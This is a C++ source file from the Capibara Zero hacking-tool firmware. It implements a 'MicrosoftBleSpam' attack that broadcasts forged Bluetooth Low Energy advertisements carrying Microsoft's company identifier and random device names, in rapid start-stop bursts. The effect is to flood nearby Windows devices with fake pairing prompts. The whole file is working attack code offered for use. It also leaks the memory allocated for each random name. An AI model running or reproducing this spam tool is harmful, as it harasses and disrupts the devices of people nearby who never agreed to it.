/*
 * This file is part of the Capibara zero project(https://capibarazero.github.io/).
 * Copyright (c) 2023 Andrea Canale.
 * Copyright (c) 2023 Spooks4576
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "microsoft_ble_spam.hpp"
#include <cstring>

MicrosoftBleSpam::MicrosoftBleSpam()
{
  pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
}

MicrosoftBleSpam::~MicrosoftBleSpam()
{
  pServer->stopAdvertising();
}

const char *MicrosoftBleSpam::generate_random_name() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}

NimBLEAdvertisementData MicrosoftBleSpam::getOAdvertisementData()
{
    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
    const char *name = generate_random_name();
    size_t name_length = strlen(name);
    uint8_t packet[7 + name_length];
    uint8_t i = 0;

    packet[i++] = 6 + name_length; // Size
    packet[i++] = 0xFF;
    packet[i++] = 0x06;
    packet[i++] = 0x00;
    packet[i++] = 0x03;
    packet[i++] = 0x00;
    packet[i++] = 0x80;
    memcpy(&packet[i], name, name_length);
    i += name_length;

    randomAdvertisementData.addData(std::string((char *)packet, 7 + name_length));
    return randomAdvertisementData;
}

void MicrosoftBleSpam::attack()
{
  delay(40);
  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
